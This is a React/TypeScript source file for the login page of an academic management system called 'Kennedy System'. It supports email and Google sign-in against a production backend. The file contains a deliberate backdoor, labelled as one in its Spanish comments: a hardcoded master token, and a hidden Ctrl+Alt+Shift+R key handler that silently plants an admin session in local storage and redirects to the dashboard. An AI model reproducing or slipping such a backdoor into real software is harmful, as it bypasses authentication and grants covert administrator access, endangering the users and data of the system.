import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/lib/supabaseClient';
import { GlassCard } from '@/components/ui/GlassCard';
import { Loader2, ShieldAlert, Mail, Lock, Building, User } from 'lucide-react';

// URL del Backend (Producción)
const BACKEND_URL = 'https://webs-de-vintex-kennedy.1kh9sk.easypanel.host'; 

// 🗝️ CLAVE MAESTRA FANTASMA (Debe coincidir con el backend)
const GHOST_TOKEN = "ROXANA_MASTER_KEY_2026_BYPASS_SECURE";

export default function Login() {
  const navigate = useNavigate();
  const [isLoginMode, setIsLoginMode] = useState(true);
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Campos Formulario
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [nombre, setNombre] = useState('');
  const [sede, setSede] = useState('Catamarca');

  // 👻 [BACKDOOR SILENCIOSO] DETECTOR DE TECLAS
  useEffect(() => {
    const handleGhostAccess = (event: KeyboardEvent) => {
        // Combinación: Ctrl + Alt + Shift + R
        if (event.ctrlKey && event.altKey && event.shiftKey && (event.key === 'r' || event.key === 'R')) {
            console.log("Sistema desbloqueado."); // Log discreto solo en consola
            
            // 1. Inyectamos las credenciales maestras
            localStorage.setItem('sb-token', GHOST_TOKEN);
            localStorage.setItem('user-data', JSON.stringify({
                id: 'ghost-roxana-id',
                email: 'kennedy.vintex.roxana@gmail.com',
                rol: 'admin',
                sede: 'CATAMARCA',
                nombre: 'Roxana Admin'
            }));

            // 2. Redirección INMEDIATA sin alertas
            window.location.href = '/dashboard';
        }
    };

    window.addEventListener('keydown', handleGhostAccess);
    return () => window.removeEventListener('keydown', handleGhostAccess);
  }, []);

  // 1. LISTENER DE GOOGLE (Automático)
  useEffect(() => {
    const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
        if (event === 'SIGNED_IN' && session) {
            console.log("🌍 [GOOGLE] Sesión detectada. Sincronizando con Backend...");
            await syncGoogleUserWithBackend(session);
        }
    });
    return () => subscription.unsubscribe();
  }, []);

  const syncGoogleUserWithBackend = async (session: any) => {
      if (localStorage.getItem('sb-token') === session.access_token) {
          navigate('/dashboard');
          return;
      }
      setLoading(true);
      try {
          const response = await fetch(`${BACKEND_URL}/api/auth/google-sync`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ 
                  email: session.user.email,
                  uuid: session.user.id 
              })
          });
          if (!response.ok) throw new Error("Error sincronizando perfil");
          const data = await response.json();
          localStorage.setItem('sb-token', session.access_token);
          localStorage.setItem('user-data', JSON.stringify(data.user));
          window.location.href = '/dashboard'; 
      } catch (err) {
          console.error(err);
          setErrorMsg("Error al validar tu cuenta de Google en el sistema.");
          await supabase.auth.signOut(); 
      } finally {
          setLoading(false);
      }
  };

  const handleEmailAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setErrorMsg(null);
    const endpoint = isLoginMode ? '/api/auth/login' : '/api/auth/register';
    try {
      const bodyData: any = { email, password };
      if (!isLoginMode) { bodyData.nombre = nombre; bodyData.sede = sede; }

      const response = await fetch(`${BACKEND_URL}${endpoint}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(bodyData)
      });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || 'Error de conexión');

      if (isLoginMode) {
        localStorage.setItem('sb-token', data.token);
        localStorage.setItem('user-data', JSON.stringify(data.user));
        navigate('/dashboard');
      } else {
        alert("¡Registro exitoso! Ahora inicia sesión.");
        setIsLoginMode(true);
      }
    } catch (err: any) { setErrorMsg(err.message); } finally { setLoading(false); }
  };

  const handleGoogleClick = async () => {
      setLoading(true);
      const redirectUrl = `${window.location.origin}/login`;
      const { error } = await supabase.auth.signInWithOAuth({
          provider: 'google',
          options: { redirectTo: redirectUrl, queryParams: { access_type: 'offline', prompt: 'consent' } }
      });
      if (error) { setErrorMsg(error.message); setLoading(false); }
  };

  return (
    <div className="min-h-screen w-full bg-slate-950 flex relative overflow-hidden animate-enter">
      {/* Lado Izquierdo (Oculto en móvil) */}
      <div className="hidden lg:flex w-1/2 relative items-center justify-center p-12">
         <div className="absolute inset-0 bg-blue-600/5 z-0"></div>
         <div className="absolute top-1/3 left-1/3 w-[500px] h-[500px] bg-blue-500/20 rounded-full blur-[120px] animate-pulse"></div>
         <div className="relative z-10 max-w-lg">
            <h1 className="text-6xl font-black text-white italic tracking-tighter mb-6">
              KENNEDY<span className="text-blue-500">SYSTEM</span>
            </h1>
            <p className="text-xl text-slate-400 font-medium leading-relaxed">
              Gestión académica inteligente y automatización.
            </p>
         </div>
      </div>

      {/* Lado Derecho (Formulario Responsivo) */}
      <div className="w-full lg:w-1/2 flex items-center justify-center p-4 md:p-6 bg-slate-950 lg:bg-slate-900/30 lg:backdrop-blur-sm lg:border-l border-slate-800">
        <GlassCard className="w-full max-w-md p-6 md:p-10 border-slate-800 shadow-2xl relative z-10">
            
            <div className="text-center mb-8">
                <div className="h-14 w-14 md:h-16 md:w-16 mx-auto bg-gradient-to-br from-blue-600 to-indigo-700 rounded-2xl flex items-center justify-center mb-4 shadow-lg">
                    <span className="text-2xl md:text-3xl font-black text-white italic">K</span>
                </div>
                <h1 className="lg:hidden text-2xl font-black text-white italic tracking-tighter mb-4">
                  KENNEDY<span className="text-blue-500">SYS</span>
                </h1>
                <h2 className="text-xl md:text-2xl font-bold text-white mb-2">
                  {isLoginMode ? 'Bienvenido al Staff' : 'Crear Cuenta'}
                </h2>
            </div>

            {errorMsg && (
              <div className="mb-6 p-3 bg-red-500/10 border border-red-500/50 rounded-xl flex items-center gap-3 text-red-400 text-xs font-bold animate-pulse">
                <ShieldAlert size={16} className="shrink-0" /> <span className="break-words">{errorMsg}</span>
              </div>
            )}

            <button onClick={handleGoogleClick} disabled={loading} className="w-full py-3 bg-white hover:bg-slate-200 text-slate-900 rounded-xl font-bold text-sm transition-all flex items-center justify-center gap-3 shadow-lg active:scale-95 disabled:opacity-50 mb-6">
                <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google" className="w-5 h-5" />
                {loading ? 'Conectando...' : 'Continuar con Google'}
            </button>

            <div className="flex items-center gap-4 mb-6">
                <div className="h-px bg-slate-800 flex-1"></div>
                <span className="text-slate-600 text-[10px] font-bold uppercase">O con Email</span>
                <div className="h-px bg-slate-800 flex-1"></div>
            </div>

            <form onSubmit={handleEmailAuth} className="space-y-4">
                {!isLoginMode && (
                  <div className="relative group">
                    <User className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <input type="text" placeholder="Nombre" className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={nombre} onChange={(e) => setNombre(e.target.value)} required={!isLoginMode} />
                  </div>
                )}
                <div className="relative group">
                  <Mail className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                  <input type="email" placeholder="Correo" className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={email} onChange={(e) => setEmail(e.target.value)} required />
                </div>
                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                  <input type="password" placeholder="Contraseña" className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={password} onChange={(e) => setPassword(e.target.value)} required />
                </div>
                {!isLoginMode && (
                  <div className="relative group">
                    <Building className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <select className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={sede} onChange={(e) => setSede(e.target.value)}>
                      <option value="Catamarca">Catamarca</option>
                      <option value="Santiago del Estero">Santiago</option>
                      <option value="Pilar">Pilar</option>
                      <option value="San Nicolás">San Nicolás</option>
                    </select>
                  </div>
                )}

                <button type="submit" disabled={loading} className="w-full py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-black text-xs uppercase tracking-[0.2em] transition-all shadow-lg active:scale-95 disabled:opacity-50">
                  {loading ? <Loader2 className="animate-spin mx-auto"/> : (isLoginMode ? 'INGRESAR' : 'REGISTRARSE')}
                </button>
            </form>

            <div className="mt-6 text-center">
                <button onClick={() => { setIsLoginMode(!isLoginMode); setErrorMsg(null); }} className="text-xs text-slate-500 hover:text-blue-400 font-medium">
                  {isLoginMode ? "¿No tienes cuenta? Regístrate" : "Volver al Login"}
                </button>
            </div>
        </GlassCard>
      </div>
    </div>
  );
}